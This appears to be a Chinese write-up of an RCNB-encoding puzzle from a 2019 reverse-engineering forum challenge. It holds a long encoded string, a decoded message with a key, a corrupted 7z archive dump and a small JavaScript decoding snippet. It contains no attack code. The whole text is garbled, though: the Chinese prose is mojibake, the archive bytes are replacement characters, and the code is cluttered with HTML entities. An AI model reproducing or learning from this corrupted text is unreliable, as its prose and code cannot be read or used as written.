ÆÈ‘ÄŠÅ…BÈÆˆÈµBÇ¹ÆÅ™crÄ‰ÆbnÆ€Æ¦Ä‹Å˜È¼Ã‘Æ€È’Ã‡Å„ÆÅ—CÈ ÆÆÃŸrÄŠÇ¹Ã¾Å—È»ÅƒÆ€È’È»ÉÄ‹NÃŸÅ–Ä‰Ç¸ÃŸÅƒÃrÆ‡È’È¼È ÆƒÅ™Æ‡ÅƒÆƒNbÅ˜Ä‹Æ¦ÄŒÅˆÆ…Å”ÄŒnBÅ—ÄŒÆbÆÃŸÅ”È¼Å”ÄŠÈ Æ€nÆ…Å–Ä‹Å•ÄÅ‡Æ„Ç¹BÅ”CÅ™Ä‹Ç¹Æ…ÈÄŒÅˆÆ€ÆÆ€Å™ÄˆÅ–ÄŒÈµÃŸÅ„ÃÉŒCÇ¹ÆƒÅ”Ä‡È“Ä‹Ã‘Ã¾Å•È¼ÆÆ„È’cÅ„bÇ¹bÈ“ÆˆÆÆ…ÉŒÄ†È Æ„Å–Ä‡Ç¹BÅ–ÆˆÅ˜Ã‡ÆÆ…Æ¦Ä‰ÅƒÆÅƒÃŸÅ–Ä‰NÆƒÅ”Ä‰Ã‘Æ„Å–ÄˆÆÃ¾È‘ÄŒÈ‘ÄŒnBÅƒÆÅ”ÄŒnÆƒÈ’ÄˆÈ“ÄˆNBÇ¸ÃŸÈCÈ ÃŸÈÄÅ…bÉÄ‰ÆÃ¾Æ¦Ä‰rÈ»Å…BÅ‡ÃŸÈ’È»Ç¸ÆÅ˜È¼Å˜Ä‹Å„BÅˆbÅ˜ÄnÆ„Å˜Ã‡È’ÆˆÅ‡Æ…Ç¹ÃÅ™Ä‡ÈÄ‡Å…ÃÆ¦Ä‹Å‡Æ„Å‡bÉŒÆ‡Æ¦Æ‡Å„Æ€ÅˆÆrÄŒRÄŒÅ†bÈ‘Ã‡Å…ÃŸÈµÆ…Å™È¼Å–Ä†Ç¸Æ€Å”CÆÆ€Å†ÃÈ“Æ‡rÄŠÅ‡Ã¾ÅˆbÅ•Ã‡ÅƒÆ„Å”ÆˆÅ„ÃÅ˜ÄŒÈÄŠÆbÅ™È»Ç¹ÆƒÉŒÄŒÈ BÅ„Æ„È’Æ‡NÃ¾Å™ÄŠÉŒÄ‡Å†BÅ•È¼È ÆƒÅ–Æ‡ÅˆÃ¾Ã‘ÃŸÈ“È¼È‘ÄŒÃ‘Æ…nÆ„ÉÄ‰nÃÅ—cÅ˜ÆˆÅˆÃŸÈ“Ä‰ÈµÆ„È‘cNbÈ ÃŸÆ¦Ã‡Å…ÆƒÉÄˆÆ¦ÄŠnÆÅ–Ã‡Å…BÅ”cÅƒÆÅ„ÆÉŒÄ‹ÅˆÃÅ•Ä‰Æ¦CÅ†Æ…Æ¦È»ÈµÆ…È“Ã‡Ç¹ÆƒÈ“Ä†È ÆƒRÈ»ÅˆÆƒÅ™Ä‡Ç¸Æ€Å—ÆˆÇ¹ÃŸÅ™Ä‰ÅˆbÈÄŒÅ„ÆÉÄˆÅ‡ÃÃ‘ÃÅ˜Ä‡Å—Ã‡NbÅ—È»Ã‘ÃRÆˆÇ¸ÆƒÇ¹Æ€Å•È»RÄ‰ÆBÅ„Ã¾Å˜È»Å”Ä†ÆÆÅ†BÅ•È»NBRÄ‰Å†ÆƒÈ“ÄŒÆÆÈÄ‹Ã‘Æ€RÄŒÅ•ÆˆÅˆÆ€rÄÅ‡Æ…ÈÄŠÅ…ÃÆ¦È¼Ç¹ÆÅˆÆƒÈ“ÄŠnÃ¾Å™ÄˆÅ˜CnÃ¾È Æ€È’cÆÆƒÉŒÄ‡ÉŒÄŠÈµÆ…Å•Æ‡ÅˆÆƒnÆ„Å”ÄÅ„ÃRÄŒÅ™È¼Å„bÅ‡ÃŸÅ•ÄŠÅˆÃ¾Å˜CÇ¹bÅ”ÄˆnbÅ•ÄŠÅ„Ã¾È‘cÅƒÆ„Å”ÄˆÅ”ÄÅ„bÈÄÈ BÅ™Ä‰Å…ÆƒÅ†ÆƒÅ˜ÆˆÉŒÃ‡Ã‘ÃÅ‡Æ„È“Ä‰ÉÄ‹ÅˆÆ…Å„Ã¾Å—CÅ™ÄŒÆÆ„RCÅ†ÃÆÆÅ”ÄˆRÈ¼NÆ…È’CnÆƒÉŒÆ‡Ç¹ÃŸÅ„ÃÅ•ÆˆÅ‡BÅ˜CÅ•È¼Ã‘BÈ’Ã‡ÅƒÃÇ¸ÆÈ“È¼Å•ÄŒÈ Ã¾ÈµÆÈ‘ÆˆÅ„Æ€Å”cÈ‘Æ‡Ã‘ÃŸrÆˆÇ¸ÃrcÅƒÃÅ‡Æ…È“Ä‡ÉŒÄ‡Å„Æ€ÉÄ‡ÅˆÆ€È Æ…Å˜È¼Ç¸ÆÉÄŠÅ™ÄÆÃÅ†ÆƒrÄŠÇ¸Æ€Å—cÈ“ÆˆÅ„Æ€Å‡Æ€ÈcrÄŠÅ…BÈ“ÄˆÈ ÆÉÄ‡nÆnÃÉŒÆ‡Ã‘ÆƒÈÈ¼ÆÃŸÅ”CÉÄ‡ÆbÆBÈ’cÅ†ÆrÄ‹nBÅ—ÆˆÈ“È»Å„ÆƒÉŒCÃ‘BÆÆ€È’ÄŒÅˆÃŸÅ”Æ‡Å™Æ‡Ç¹bÅ–cÅ†ÆƒÅ•Ä†ÅˆÃ¾Å•ÄŒÅ†Æ…È’Ä‰Å‡Æ…ÈÄˆÅ‡ÆÈ ÆƒRÄ‰Å”Æ‡Ç¸Ã¾Å˜ÄŠÈµÃŸÅ”È¼Å„bÈ‘ÆˆÈ BÇ¹BÉŒÄÈµÆƒrÄÇ¹Æ„Å”È»ÆÆ…Å—È¼È’Ä†ÆÆ€Å–Ä‰ÈµbÅ•cÆÃÈ’È¼Å„BrÄ‹Ç¸Æ…Å˜cÈ ÃÈÄÆbÈ“ÄŠÅ…bÅ˜CÈ Æ€ÉÄ†È Æ…Å•Ä‰NÆ€È ÃÅ–Ä‡Å™Ä‹Å„ÆÅ„Ã¾È“Ä‰È ÆÆ¦È»nÆ€È“Ã‡ÉÄˆÅ…Æ…Ç¸Æ€È“ÄÈ’È»Å†Æ€Ç¹ÃÉcÈ‘Ä†ÈµÆƒrÈ»ÆÆ€ÉŒCÅƒÃ¾ÉÄˆÈµÃ¾Å–ÄŒÅ†ÃŸÅˆÆ…Å—Ä‰Ã‘ÃÅ•ÆˆÈ‘cÅƒÆÇ¸ÃŸÈ’Æ‡ÈÃ‡ÆÃŸÅ„bÅ•ÆˆÈµBÅ•Æ‡nÆ„È“Ä‹È‘È¼È BÉÄ‹Å…ÃÅ—Ä‹Å…ÆƒÆ¦ÄÅ„Æ„ÅˆÃRÃ‡rcÅ…Æ„ÈÃ‡È ÃÅ™ÄÈ ÃÆBÉŒÈ¼ÉÄˆÅ‡Ã¾ÉÄ‰Ã‘Æ…Ç¸BrÄ†ÅˆÆƒÅ–È»Å•ÄÈµbÅ†ÃŸÅ˜ÄŠÆÆ€ÈÆˆnÃ¾Å˜ÄÈ“È»Ã‘ÃÅ•cÅ„Ã¾Å†bÅ”È¼ÉŒÄŒÃ‘BÉŒÄÈµbÈ‘ÄˆÅ…BÅ•Ä‰ÆÆ„Ã‘Ã¾È’Ã‡È“È»NÆ€Ã‘ÃŸÅ˜ÄˆÃ‘Æ€ÈÈ¼ÆBÅ”ÄˆÈµÃ¾ÉÄŠÃ‘ÃŸÅ•Ä‰È’È¼nÃ¾Å•Ã‡Å†bÅ„Ã¾ÉÄ†Å…ÃÅ—ÄŠÅƒÆƒRÄ‹Å†Æ…Å˜cNÃ¾È‘Ä†Å…ÆrÆˆÇ¸Æ„È’CÆÃ¾Å–È»rÃ‡Å‡bÅ™ÄŠÅ…Æ…È‘ÆˆÅƒBÆ¦Ä‹nÃŸÅˆÆ…Æ¦Ä‰Ã‘Ã¾È“ÄˆÅ™È¼ÅƒÆ€ÉcÅƒÆ„ÈµÃ¾ÉŒCÅ™Ä†NÆ„Ç¹Æ„Æ¦È»Å”ÄÅ…ÆƒnÆ…rÄ‹rCÇ¸Æ„È“ÆˆÅƒÆ€rÃ‡nÆrCÃ‘Æ…rCÈµÆ€rÆˆÇ¹ÃŸrÆˆÈµÆRÄ†ÆÆrÃ‡Å‡ÃÈµÃŸÆ¦ÄŒÈ‘È¼Ç¸ÆÇ¹BÈ‘cÉŒÆˆÆÃÈ’Ä†Å…ÃrÄ†ÅˆÆƒRÄ‡Å‡ÆÈ Æ…È“crc è¿™é‡Œç»™äº†ä¸€ä¸ªç½‘ç«™ï¼Œä¸Šé¢å¯ä»¥è§£å¯†ï¼Œå¾—åˆ°æ˜æ–‡mdæ–‡ä»¶ï¼š 12345678910111213141516171819202122232425262728293031323334# Prove your NiubilityHello there, Welcome to the 52PoJiE Spring Festival 2019 Challenge - RCNB.To prove you are as NB as RC, complete this trial![It&apos;s dangerous to go alone, take this!](//rcnb.xyz)And the key: Which_is_N0t_Th3_Answ3rWith the trial:7zï¿½ï¿½&apos;ï¿½Gï¿½Ö&apos;ï¿½lÃ—vï¿½ï¿½ï¿½ï¿½2!ï¿½ï¿½ï¿½!$ï¿½xï¿½Zï¿½Ë¤ï¿½XĞ‚Yï¿½=ï¿½ï¿½Wï¿½Kï¿½Ã¯ï¿½zï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½rï¿½$]ï¿½Iï¿½ï¿½qï¿½Ibï¿½ï¿½iÔï¿½2Cï¿½ï¿½ï¿½Zï¿½`ï¿½3ï¿½ï¿½EWï¿½w3Xï¿½ï¿½ ïŠ¨ï¿½ï¿½*2ï¿½ &apos;]ï¿½Kzï¿½,&lt;` ï¿½ï¿½5ï¿½&amp;ï¿½QTï¿½~ï¿½zï¿½rq+ï¿½Iï¿½1Ô°ï¿½ï¿½ï¿½ï¿½r?ï¿½Rï¿½ï¿½ï¿½Yï¿½5Xï¿½&lt;rAï¿½ï¿½ï¿½Uï¿½ï¿½[ï¿½ï¿½ï¿½Gï¿½ï¿½^*ï¿½O- GPï¿½ï¿½ï¿½lï¿½ï¿½ï¿½ï¿½.:ï¿½7ï¿½3ï¿½ï¿½:*J(vï¿½ï¿½]ï¿½ï¿½,ï¿½hï¿½ï¿½ï¿½ï¿½nOËï¿½ï¿½Xï¿½&amp;ï¿½6ï¿½=Z\\ï¿½ï¿½ï¿½ï¿½gï¿½hï¿½y6Iï¿½ï¿½nNJï¿½)ï¿½&amp;ï¿½ï¿½ï¿½yCEï¿½ï¿½Aï¿½ï¿½#ï¿½ 8ï¿½ï¿½Èr&apos;ï¿½M\\?oï€‘:ï¿½ï¿½Wï¿½ï¿½Vaï¿½)ï¿½ï¿½ï¿½ï¿½Dï¿½ï¿½.ï¿½5Vï¿½ï¿½Giï¿½ï¿½Aï¿½ï¿½)ï¿½,~ï¿½ HÂ¬?ï¿½ï¿½ï¿½&amp;ï¿½ï¿½Vï¿½ï¿½ï¿½ï¿½ï¿½~_;ï¿½P|ï¿½($ï¿½e00&quot;ï¿½ï¿½èˆ&#123;ï¿½ï¿½ï¿½ï¿½ï¿½8ï¿½]ï¿½-1ï¿½ï¿½_Zï¿½ï¿½G=ï¿½)oPdï¿½ï¿½)ï¿½ï¿½ï¿½w;ï¿½ï¿½ï¿½ï¿½8zOiï¿½ï¿½|&amp;ï¿½ï¿½ï¿½]Ã ï¿½&apos;ï¿½Cï¿½qï¿½ï¿½ï¿½ï¿½ï¿½SD&gt;ï¿½ï¿½!ï¿½ï¿½bï¿½ï¿½_ï¿½ |ï¿½Fï¿½-ï¿½&apos;ï¿½ï¿½ï¿½ï¿½-ï¿½Ú·ï¿½ï¿½ï¿½ç•¢&#123;ï¿½Ù™ï¿½ï¿½ ï¿½tiï¿½ï¿½Eï¿½ï¿½Ş•;ï¿½ï¿½ï¿½ï¿½ï¿½[&apos;ï¿½ï¿½Ylï¿½×™*bï¿½ï¿½ï¿½ï¿½Gï¿½1ï¿½Bï¿½ï¿½ï¿½ï¿½ï¿½~ï¿½:ï¿½Ùˆï¿½ï¿½×‰ï¿½ï¿½Aenqdï¿½)Ã¼#ï¿½EG-:ï¿½S/ï¿½ACb_[ï¿½Vï¿½Hï¿½l=Vgï¿½-ï¿½Û´ï¿½b7&amp;ï¿½ï¿½ï¿½ihCzï¿½ï¿½KLE0ï¿½ï¿½)ï¿½ï¿½Hå’£BTï¿½0(kï¿½ï¿½ï¿½ï¿½mï¿½&quot;ï¿½`ï¿½ï¿½bï¿½Ä¥qï¿½&lt;IUï¿½1ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½\\ï¿½ï¿½[ï¿½kï¿½ï¿½%ï¿½ï¿½ï¿½&quot;É¡ï¿½è½a8ï¿½ï¿½Hï¿½ï¿½gbï¿½ï¿½Q Jï¿½ï¿½ZLLï¿½ï¿½ï¿½_ï¿½$ï¿½|ï¿½É¡ï¿½ï¿½ï¿½ï¿½Rï¿½Eï¿½wuï¿½ï¿½t7#)Sï¿½\\ï¿½ï¿½ï¿½ï¿½ï¿½;&#123;lï¿½Wï¿½ï¿½ï¿½ï¿½ï¿½Iï¿½*Yï¿½ï¿½&#125;ï¿½ï¿½GNï¿½pï¿½k*ï¿½?ï¿½2ï¿½@ï¿½Sï¿½&#125;ï¿½ï¿½ï¿½33ï¿½ï¿½ï¿½v ï¿½ï¿½ï¿½/ï¿½ï¿½ï¿½^Ó‡ï¿½ï¿½!ï¿½Rï¿½Nï¿½ï¿½Fï¿½ï¿½5[ï¿½2ï¿½bvX ï¿½ï¿½ßï¿½EØ%ï¿½ï¿½ï¿½dï¿½ï¿½ï¿½ ï¿½ï¿½Tï¿½@ï¿½ï¿½dyï¿½ï¿½rï¿½ï¿½Bï¿½ ï¿½ï¿½?aHxï¿½ï¿½ï¿½ï¿½ï¿½&quot;ï¿½gï¿½ï¿½ï¿½ï¿½å‘´^+ï¿½ï¿½|t$&#125;ï¿½xï¿½C.ï¿½ï¿½ï¿½bpï¿½Xï¿½lU|ï¿½ï¿½&amp;×¶ï¿½ï¿½&#125;(ï¿½ï¿½ï¿½Oï¿½eq8s=åº—ï¿½Cï¿½#^ï¿½cï¿½Qï¿½ï¿½&gt;ï¿½8ï¿½ï¿½^ï¿½ï¿½ï¿½Ö™ï¿½ï¿½ï¿½b6&amp;ï¿½ï¿½iï¿½5FTï¿½m$5ï¿½|ï¿½Xï¿½tAï¿½ï¿½ï¿½sï¿½ï¿½&#125;ï¿½ï¿½.hï¿½ï¿½ï¿½Yï¿½ï¿½rï¿½&#125;ï¿½(ï¿½,ï¿½&lt;Wï¿½ï¿½ï¿½Vï¿½ï¿½ï¿½ï¿½ï¿½`ï¿½V08Kï¿½ï¿½ -Vï¿½CVï¿½ï¿½&#125;ï¿½~dï¿½ï¿½ï¿½ 0ï¿½yï¿½ï¿½ qï¿½ï¿½ï¿½ï¿½wWxZeï¿½ï¿½#q&quot;ï¿½×´ï¿½=ï¿½%ï¿½ï¿½hï¿½!ï¿½ï¿½_ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½#ï¿½ï¿½á·«DA8^kJqÉŠï¿½=Eï¿½&#123;%ï¿½m&gt;ï¿½ï¿½kï¿½ p $ï¿½SLË“`ï¿½ï¿½]y bvï¿½ï¿½ æœ€åé¢ç»™å‡ºçš„trialçœ‹å¼€å¤´æ˜¾ç„¶æ˜¯ä¸ª7zï¼Œé‚£ä¸Šé¢çš„keyåº”è¯¥å°±æ˜¯å¯†ç äº†ã€‚æˆ‘æŠŠå®ƒå­˜ä¸ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œç„¶è€Œè¿™ä¸ªå­—ç¬¦ï¿½ä¸¥é‡å¹²æ‰°äº†æˆ‘å¥½å‡ ä¸ªå°æ—¶ï¼Œè®©æ‡µé€¼çš„æˆ‘ä¸€åº¦ä»¥ä¸ºè¿™æ˜¯é¢˜ç›®è®¾è®¡çš„åŠ å¯†ã€‚ä¸€å¼€å§‹æˆ‘xxdäº†ä¸€ä¸‹æ–‡ä»¶ï¼Œå‘ç°æœ‰ä¸‰ä¸ªå­—èŠ‚efbfbdé¢‘ç¹å‡ºç°505æ¬¡ï¼š æ ¹æ®7zæ–‡ä»¶å¤´377a bcaf 271c 0004å°è¯•è¿‡æ›¿æ¢ï¼Œä¸€åº¦ä»¥ä¸ºæ‰è¿›äº†è„‘æ´çš„é™·é˜±ã€‚ç›´åˆ°æˆ‘çœ‹åˆ°è¿™ç¯‡æ–‡ç« ï¼Œæ‰çŸ¥é“è¿™ä¸²å­—èŠ‚å°±æ˜¯é‚£ä¸ªå­—ç¬¦ã€‚ åæ¥åœ¨githubä¸Šæ‰¾åˆ°äº†rcnbçš„æºç ï¼Œä¿®æ”¹jsï¼Œå°†æ˜æ–‡æ¯ä¸ªå­—èŠ‚ä»¥intçš„å½¢å¼è¾“å‡ºï¼Œå†ç”¨pythonä¸€è·‘æ‹¿åˆ°å‹ç¼©åŒ…ï¼š 123456789function printRes(str) &#123; var res=rcnb.decode(str) for(var i=0; i&lt;res.length; i++) &#123; console.log(res[i]) &#125; // console.log(res)&#125;printRes('Å˜ÄˆÃ‘Æ€ÆÆ„Å˜È»Å–ÄŠÇ¸Æ€rcnÆƒÅˆÃŸÉÄ‰ÆÆ€RÄŒÅ†bRÃ‡rcnbrcnbrcnbÅ–ÄŠÆÆƒrcnbrcnbrcnbrÄŒNÃ¾È“Ä‰ÆÆnÆ…Å”Æ‡Å„ÃrÄ‡Ç¹ÆÈ“Ä†Ã‘Æ…Å”È¼Å•Ã‡ÆÆ…ÆÃŸÈCÅ…ÆÈÆ‡Å–Ä†ÅˆÆÉŒÆ‡ÈµÆƒÈ‘ÄˆÈ ÆƒNÆƒÆ¦ÄÆÆ„È“Ä‰Å•ÄŒÅˆÆƒÅ‡bÈÄ†È‘Ä‡nÆ…Å˜È¼ÈµÃŸÆÃŸRÄ†Ç¸Æ„ÉŒCÆBÈ‘ÄŠÅ…ÃÅ—ÄŠÉŒÈ¼ÅƒÃŸÅ‡ÆÅ”cÅ”ÆˆÇ¹ÃÈ ÆÉŒÄ†Å„Æ…ÉÄ‰ÆÃÅ–Ã‡ÉŒcÅ‡Æ…Å–Ä†nÃ¾Å„ÆÈ“ÄŒÅˆÆ„Å˜È»È“È»nÆƒÇ¸ÆÉŒCÈ’Ä‡ÈµÆÈµÆ„ÉŒCÅ…Æ…ÈÄÅƒÆ€Å™CÅ™Æ‡Å‡ÆÇ¸Ã¾Å™Ã‡ÆbÆ¦ÄŒnbRCÆÃŸÈÄ‡Ç¹ÆÅ”È»Å™È»Å†BÇ¹BÈ‘Ä‹Å—Ã‡ÆÆƒÈ BÉŒÄ†Ã‘ÆƒÅ•ÄÅ†ÆƒÈ“Æ‡Å„bÅ–ÄÃ‘bÉŒÄŠÅ—ÆˆÃ‘BRcÆÆÈ‘Æ‡Å„ÃÆ¦ÄŒÇ¹Æ€Ç¸Æ€Å˜cÅ˜È»nÆ…RCÅ†ÆƒÅ…Æ„ÈÄ‰NÃÅ˜ÄˆÃ‘Æ„Å•ÄÈÄ‡Ç¹bÅ‡ÃÈ“Ä‡Ç¹ÃŸÉŒÄˆÅ”È»ÅˆÆ€ÆbÈÃ‡rCÇ¹ÃÈ“È»ÅƒBÅ„Æ„ÉÄ‹Å„bÉŒÄŒÅ—Æ‡nÆ…ÈµÆ€Å—Ä‹Å†ÃŸRCÅ‡bÅ™ÄŒÅ™Ä‡Ã‘Æ€ÈÄŠÅƒbÇ¸Æ…ÉcÈ‘CÈµbÇ¸ÃŸÈ‘Æ‡È‘CÇ¹Æ…Å˜È»ÅƒÆƒÅ™Ä‹ÅƒÃ¾nÆ„RÄ‹Ç¹BrÆ‡Å„ÆƒÅ–ÄˆÈ‘Ä‰Å†bÆÆ…Æ¦Ä†rCÆÃÆ¦Ä†Ã‘BÅ†Æ„rÄ‡È‘Æ‡Ã‘Æ…Å„Æ„Æ¦Æ‡Å—Ä†nÆ€Å”Ä†È Æ„ÈÄ‡NÆ€Ã‘Æ…Æ¦È¼È“Ä‰Å‡Æ„ÈµÃŸÈ‘CÇ¹Æ„ÈÈ¼Å—Ä‡È ÆƒÅ…BÈ“CÈ ÆÅ”Ä‹ÆÃŸÅ™cÅ˜ÄÅ…bÆ¦ÄŠÆÆƒÉŒÄ‹ÆÆ€nÆÅ˜È»Ã‘bÅ–ÄÅ—CnÃ¾È’È»Ã‘Æ…NÃ¾Å™È¼rÆˆNÆÅ•Ä†ÆBÈÃ‡ÅˆÆ…ÈCÅƒÃŸÅ…Æ„rÄ‡ÆÆ€È“ÄŠÅ„ÆƒÅ–Æ‡Ç¸ÆÅ™Ä‹Å˜Ä‡ÅƒÆÅ˜È¼Ã‘Æ…È‘Ä‹ÈµÆ€ÅƒÃ¾rÆ‡ÅƒÃŸÅ•Ä‰rÄ‡NÃ¾È’È»ÆÆÉŒÆˆÈ bÆ¦ÄŠNÆ…Å”CÆÃŸÈ“ÄŒÅ„ÃÆ¦Ä‹Å‡bÅ–ÆˆÅ†ÆƒÅ–Ä‰ÈµÃ¾nÆƒÉÄ‰ÉŒÆˆÅˆÃÅ™ÄÇ¹BÈ bÅ•Ä‰Å™Ä‹Å„Ã¾Å†Æ„È‘Ã‡ÆÆÈ’cÅ˜Ä‰Ç¸Æ…ÅˆÆƒÈ’cÅ”ÄˆÅ„ÃŸÇ¹ÆÆ¦Ä‡È“È¼Ç¹ÆÃ‘ÆÆ¦CÈ‘Ä‹Å‡Æ„È“ÆˆnÆ„ÈµÆ„rcÅ˜ÄnÆƒÈµÃŸRÄÈ‘cNÆrÄŠNÆ…ÈÃ‡Å‡ÆÅ†ÆÈ’ÄnÆ€ÉŒÄŒÅˆbÉŒÄ†rÈ¼ÆÃÅ‡ÆƒÉŒCÅ™Ã‡nÃ¾ÅˆÆ…È’È¼ÆBÈ‘cÈÈ»nBÅˆÆÈ‘Ä‹È“cÈ bÇ¹Ã¾È‘Æ‡Ç¹ÆrÄˆÅ–ÆˆÅˆÆÅ—cÈµbÅˆÃ¾Å™È¼Æ¦ÄˆÅƒÆ…ÅˆÃŸÅ—cÅƒÆ€Æ¦ÄŠÅ”cÅ„ÃÅ–Ä‰È Æ…ÅƒÆÈ‘ÄŠÈÃ‡È Ã¾ÆÃÉŒÆ‡ÈµÆ…ÈÈ¼ÉÄ‰Ã‘BrÆ‡Å‡Æ…Å”ÄÆÃŸnÆ…Å—ÄˆÉÄ†ÈµÆ…Å–ÄŒÅ†bÅ–Ä†È ÃÈ’Ä‹Ã‘ÆƒÅ—Ä‹NÆƒÅ•È»ÅƒÃNÃÅ”ÄÅ•Ä†ÆÆƒNÆƒRÄŒÈÄ†Å†ÆÅƒÆ€Å™Ä‹ÅƒbÈ“ÄÆÆƒÈ‘cÅ”Ä†NÃ¾È‘ÄÈ bÅ—Ä†NÃ¾Å‡ÆÈ“ÄrÄÅƒÆ„È‘Ä‰nÃ¾Å…Ã¾È“È»Å™cÃ‘Æ„Å–Æ‡Ã‘ÃŸÈÄ†Å„bÅ…bÅ•ÄŠÅƒÃŸÅ•ÄŒÅ‡ÃÈ’cÃ‘ÆÈ‘Ä†Å˜Ã‡Å„ÆƒRÆˆÇ¸Æ…Å•cÈ bÅ†ÃÈ‘Ä‹RÆˆÅ‡Æ€ÈcÅˆÃ¾Å„ÃÆ¦ÄˆÉCÈ Æ€Ã‘BRÄ‰Ç¸ÆÅ—È¼È‘Æ‡nÆÈµÃŸÅ•Æ‡Å–Ä‹ÆÆ…Å™Æ‡Ç¹Ã¾Å‡Æ„Å–Ã‡È ÆƒRÄˆÇ¸Æ…Å•Æ‡Å†Ã¾Å”ÄŠÅ™ÆˆÅˆbÆÃŸrÆˆÅ•Ã‡Ç¸Ã¾ÅƒÃÈÄ†nbÈ‘Ä‰È‘È»Ç¸ÆƒÇ¹Æ€RÆ‡rÆˆNbnÆ„rÄ‹rÄ‰Å…BÆ¦cÅˆÃ¾RÄ‹ÅˆÆnBÅ—È¼Ã‘ÆÅ•Ä‹ÆÃŸÉÄˆÅ—Ä‡Å†Æ€Ç¹ÆÈ‘ÄˆÅ…Ã¾Å”Æ‡ÅˆÆ…Å—Æ‡rÄŠÇ¹Æ„Ç¸ÃŸÈ’ÆˆÇ¹ÃŸÅ•È»È BÅ”Ä‡ÆÃ¾Å”È»Ã‘BÈ“Ä†Ç¸ÃÈ‘Ä‹Å•Ä‰ÅƒÃ¾ÅƒÆ€Å˜cÅ™È»Ã‘BÅ…Æ€ÉŒÆˆÅ„Æ„Å”ÄŠÃ‘ÃÆ¦ÄˆÆÆƒÈ“È¼Å†ÆÅ˜È»nÆ„Å”Ä‡Å–Ä‹Ç¸Æ„Å…BÅ–Ã‡È“Ä‰Å…BÅˆÆ„ÈÈ¼Å–Ã‡Å†bÇ¹Æ…rÈ»Ã‘ÃÅ”ÄŒÅ…ÃŸÅ”ÄŠNÃ¾ÉŒÆ‡È ÃRÄ‰nÃ¾Å™ÄÅ•Ä‹NÃ¾È Ã¾Æ¦È¼È Æ…RÄ†Ã‘Æ„Å—Ä‡Å˜ÄÅƒÆ„Å–Ã‡Ã‘Æ„Ç¹bÈ‘Ä†Å–Ã‡Ç¹Ã¾ÆÆ„È“cÆÆRCÇ¸Æ„ÉÄ‡È’ÄŒNÆ…È“È»ÅˆÃÅ†BRÄ†ÆbÅ™Æ‡Å–cÈ bÅ™È»Å„Æ„Å—Ä†ÅƒÃÅƒBÆ¦Ä‰Å—ÄŠNÃ¾Å™ÄŠÅ†ÃŸÈ’Ä†È ÆÈ‘ÄŠÅ…BÈÆˆÈµBÇ¹ÆÅ™crÄ‰ÆbnÆ€Æ¦Ä‹Å˜È¼Ã‘Æ€È’Ã‡Å„ÆÅ—CÈ ÆÆÃŸrÄŠÇ¹Ã¾Å—È»ÅƒÆ€È’È»ÉÄ‹NÃŸÅ–Ä‰Ç¸ÃŸÅƒÃrÆ‡È’È¼È ÆƒÅ™Æ‡ÅƒÆƒNbÅ˜Ä‹Æ¦ÄŒÅˆÆ…Å”ÄŒnBÅ—ÄŒÆbÆÃŸÅ”È¼Å”ÄŠÈ Æ€nÆ…Å–Ä‹Å•ÄÅ‡Æ„Ç¹BÅ”CÅ™Ä‹Ç¹Æ…ÈÄŒÅˆÆ€ÆÆ€Å™ÄˆÅ–ÄŒÈµÃŸÅ„ÃÉŒCÇ¹ÆƒÅ”Ä‡È“Ä‹Ã‘Ã¾Å•È¼ÆÆ„È’cÅ„bÇ¹bÈ“ÆˆÆÆ…ÉŒÄ†È Æ„Å–Ä‡Ç¹BÅ–ÆˆÅ˜Ã‡ÆÆ…Æ¦Ä‰ÅƒÆÅƒÃŸÅ–Ä‰NÆƒÅ”Ä‰Ã‘Æ„Å–ÄˆÆÃ¾È‘ÄŒÈ‘ÄŒnBÅƒÆÅ”ÄŒnÆƒÈ’ÄˆÈ“ÄˆNBÇ¸ÃŸÈCÈ ÃŸÈÄÅ…bÉÄ‰ÆÃ¾Æ¦Ä‰rÈ»Å…BÅ‡ÃŸÈ’È»Ç¸ÆÅ˜È¼Å˜Ä‹Å„BÅˆbÅ˜ÄnÆ„Å˜Ã‡È’ÆˆÅ‡Æ…Ç¹ÃÅ™Ä‡ÈÄ‡Å…ÃÆ¦Ä‹Å‡Æ„Å‡bÉŒÆ‡Æ¦Æ‡Å„Æ€ÅˆÆrÄŒRÄŒÅ†bÈ‘Ã‡Å…ÃŸÈµÆ…Å™È¼Å–Ä†Ç¸Æ€Å”CÆÆ€Å†ÃÈ“Æ‡rÄŠÅ‡Ã¾ÅˆbÅ•Ã‡ÅƒÆ„Å”ÆˆÅ„ÃÅ˜ÄŒÈÄŠÆbÅ™È»Ç¹ÆƒÉŒÄŒÈ BÅ„Æ„È’Æ‡NÃ¾Å™ÄŠÉŒÄ‡Å†BÅ•È¼È ÆƒÅ–Æ‡ÅˆÃ¾Ã‘ÃŸÈ“È¼È‘ÄŒÃ‘Æ…nÆ„ÉÄ‰nÃÅ—cÅ˜ÆˆÅˆÃŸÈ“Ä‰ÈµÆ„È‘cNbÈ ÃŸÆ¦Ã‡Å…ÆƒÉÄˆÆ¦ÄŠnÆÅ–Ã‡Å…BÅ”cÅƒÆÅ„ÆÉŒÄ‹ÅˆÃÅ•Ä‰Æ¦CÅ†Æ…Æ¦È»ÈµÆ…È“Ã‡Ç¹ÆƒÈ“Ä†È ÆƒRÈ»ÅˆÆƒÅ™Ä‡Ç¸Æ€Å—ÆˆÇ¹ÃŸÅ™Ä‰ÅˆbÈÄŒÅ„ÆÉÄˆÅ‡ÃÃ‘ÃÅ˜Ä‡Å—Ã‡NbÅ—È»Ã‘ÃRÆˆÇ¸ÆƒÇ¹Æ€Å•È»RÄ‰ÆBÅ„Ã¾Å˜È»Å”Ä†ÆÆÅ†BÅ•È»NBRÄ‰Å†ÆƒÈ“ÄŒÆÆÈÄ‹Ã‘Æ€RÄŒÅ•ÆˆÅˆÆ€rÄÅ‡Æ…ÈÄŠÅ…ÃÆ¦È¼Ç¹ÆÅˆÆƒÈ“ÄŠnÃ¾Å™ÄˆÅ˜CnÃ¾È Æ€È’cÆÆƒÉŒÄ‡ÉŒÄŠÈµÆ…Å•Æ‡ÅˆÆƒnÆ„Å”ÄÅ„ÃRÄŒÅ™È¼Å„bÅ‡ÃŸÅ•ÄŠÅˆÃ¾Å˜CÇ¹bÅ”ÄˆnbÅ•ÄŠÅ„Ã¾È‘cÅƒÆ„Å”ÄˆÅ”ÄÅ„bÈÄÈ 